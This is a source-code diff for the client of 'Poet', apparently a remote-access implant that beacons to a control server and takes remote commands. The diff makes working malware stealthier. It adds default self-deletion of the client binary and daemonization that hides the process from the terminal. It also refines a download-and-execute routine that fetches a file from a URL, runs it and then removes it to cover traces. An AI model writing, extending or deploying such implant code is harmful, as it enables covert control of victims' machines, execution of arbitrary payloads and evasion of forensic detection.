@@ -13,14 +13,18 @@ import os.path
 import urllib2
 import argparse
 import tempfile
-import logging as log
 import subprocess as sp
-from datetime import datetime
 
+import debug
 import config as CFG
 from poetsocket import *
 
 UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
+
+if __file__.endswith('.py'):
+    CLIENT_PATH = os.path.abspath(__file__)
+else:
+    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))
 
 
 class PoetSocketClient(PoetSocket):
@@ -73,16 +77,9 @@ class PoetClient(object):
                         s.send(e.strerror)
                 elif inp == 'selfdestruct':
                     try:
-                        # if the flag to delete client on launch wasn't given
-                        if not ARGS.delete:
-                            os.remove(ZIPPATH)
-
-                        # check it's actually deleted
-                        if __file__.split('/')[-2] not in os.listdir(parent(ZIPPATH)):
-                            s.send('boom')
-                            sys.exit()
-                        else:
-                            raise Exception('client not deleted')
+                        selfdestruct()
+                        s.send('boom')
+                        sys.exit()
                     except Exception as e:
                         s.send(str(e.message))
                 elif inp.startswith('dlexec '):
@@ -97,7 +94,7 @@ class PoetClient(object):
                     s.send('Unrecognized')
             except socket.error as e:
                 if e.message == 'too much data!':
-                    s.send('psh : ' + e.message)
+                    s.send('posh : ' + e.message)
                 else:
                     raise
         s.close()
@@ -132,11 +129,31 @@ class PoetClient(object):
         r = urllib2.urlopen(inp.split()[1])
         with tempfile.NamedTemporaryFile(delete=False) as f:
             f.write(r.read())
+            f.flush()
             os.fchmod(f.fileno(), stat.S_IRWXU)
+
         # intentionally not using sp.call() here because we don't
         # necessarily want to wait() on the process. also, this is outside
         # the with block to avoid a `Text file busy' error (linux)
         sp.Popen(f.name, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
+
+        # we need this sleep(1) because of a race condition between the
+        # Popen and following remove. If there were no sleep, in the Popen,
+        # between the time it takes for the parent to fork, and the child's
+        # exec syscall to load the file into memory, the parent would return
+        # back here and delete the file before it gets executed. by sleeping
+        # 1 second, we give the child a reasonable amount of time to hit the
+        # exec syscall.
+        #
+        # NOTE: this is not a 100% solution. if for some reason, the time
+        # between the child fork/exec is longer than 1 second (lol) the file
+        # will still be deleted before it's executed. a "safer" solution would
+        # be to keep track of all the paths of files downloaded and add a
+        # shell "cleanup" command which could be run regularly to remove all
+        # those paths after you know they're executed
+        time.sleep(1)
+
+        os.remove(f.name)
 
     def chint(self, s, inp):
         """Handle server `chint' command.
@@ -146,7 +163,7 @@ class PoetClient(object):
 
         if inp == 'chint':
             # no arg, so just send back the interval
-            s.send(str(ARGS.interval))
+            s.send(str(args.interval))
         else:
             # set interval to arg
             try:
@@ -154,7 +171,7 @@ class PoetClient(object):
                 if num < 1 or num > 60*60*24:
                     msg = 'Invalid interval time.'
                 else:
-                    ARGS.interval = num
+                    args.interval = num
                     msg = 'done'
                 s.send(msg)
             except Exception as e:
@@ -162,7 +179,7 @@ class PoetClient(object):
 
 
     def shell(self, inp, s):
-        """Psh `shell' command client-side.
+        """Posh `shell' command client-side.
 
         Create a subprocess for command and line buffer command output to
         server while listening for signals from server.
@@ -248,9 +265,12 @@ def get_args():
                         help='Beacon Interval, in seconds. Default: 600',
                         nargs='?', default=600)
     parser.add_argument('-p', '--port')
-    parser.add_argument('-v', '--verbose', action="store_true")
-    parser.add_argument('-d', '--delete', action="store_true",
-                        help="delete client upon execution")
+    parser.add_argument('--debug', action="store_true",
+                        help="show debug messages. implies --no-daemon")
+    parser.add_argument('--no-daemon', action='store_true',
+                        help="don't daemonize")
+    parser.add_argument('--no-selfdestruct', action='store_true',
+                        help="don't selfdestruct")
     return parser.parse_args()
 
 
@@ -283,47 +303,85 @@ def is_active(host, port):
     return False
 
 
-def parent(file):
-    """Returns filesystem parent."""
+def selfdestruct():
+    """Delete client executable from disk.
+    """
 
-    return os.path.abspath(file).rsplit('/', 1)[0]
+    if os.path.exists(CLIENT_PATH):
+        os.remove(CLIENT_PATH)
+
+
+def daemonize():
+    """Daemonize client.
+    http://www.jejik.com/articles/2007/02/a_simple_unix_linux_daemon_in_python/
+    """
+
+    # already a daemon?
+    if os.getppid() == 1:
+        return
+
+    # break out of shell
+    try:
+        pid = os.fork()
+        if pid > 0:
+            sys.exit(0)
+    except OSError:
+        # silently faily
+        sys.exit(1)
+
+    # standard decoupling
+    os.setsid()     # detach from terminal
+    os.umask(0022)  # not really necessary, client isn't creating files
+    os.chdir('/')   # so we don't block a fs from unmounting
+
+    # denature std fd's
+    si = file('/dev/null', 'r')
+    so = file('/dev/null', 'a+')
+    se = file('/dev/null', 'a+', 0)
+    os.dup2(si.fileno(), sys.stdin.fileno())
+    os.dup2(so.fileno(), sys.stdout.fileno())
+    os.dup2(se.fileno(), sys.stderr.fileno())
 
 
 def main():
-    global ARGS, ZIPPATH
-    ARGS = get_args()
-    # path to zip file
-    ZIPPATH = parent(__file__)
+    global args
+    args = get_args()
 
-    if ARGS.verbose:
-        log.basicConfig(format='%(message)s', level=log.INFO)
-    else:
-        log.basicConfig(format='%(message)s')
+    # daemonize if we're not in --no-daemon or --debug mode
+    if not args.no_daemon and not args.debug:
+        daemonize()
 
-    if ARGS.delete:
-        log.info('[+] Deleting client.')
-        os.remove(ZIPPATH)
+    # disable debug messages if we're not in --debug
+    if not args.debug:
+        debug.disable()
 
-    HOST = ARGS.host
-    PORT = int(ARGS.port) if ARGS.port else 443
+    if not args.no_selfdestruct:
+        debug.info('Deleting client')
+        try:
+            selfdestruct()
+        except Exception as e:
+            # fatal
+            sys.exit(0)
 
-    log.info(('[+] Poet started with interval of {} seconds to port {}.' +
-              ' Ctrl-c to exit.').format(ARGS.interval, PORT))
+    HOST = args.host
+    PORT = int(args.port) if args.port else 443
+
+    debug.info(('Poet started with interval of {} seconds to port {}. Ctrl-c to exit').format(args.interval, PORT))
 
     try:
         while True:
             if is_active(HOST, PORT):
-                log.info('[+] ({}) Server is active'.format(datetime.now()))
+                debug.info('Server is active')
                 PoetClient(HOST, PORT).start()
             else:
-                log.info('[!] ({}) Server is inactive'.format(datetime.now()))
-            time.sleep(ARGS.interval)
+                debug.warn('Server is inactive')
+            time.sleep(args.interval)
     except KeyboardInterrupt:
         print
-        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
+        debug.err('Poet terminated')
     except socket.error as e:
-        log.info('[!] ({}) Socket error: {}'.format(datetime.now(), e.message))
-        log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
+        debug.warn('Socket error: {}'.format(e.message))
+        debug.err('Poet terminated')
         sys.exit(0)
 
 if __name__ == '__main__':
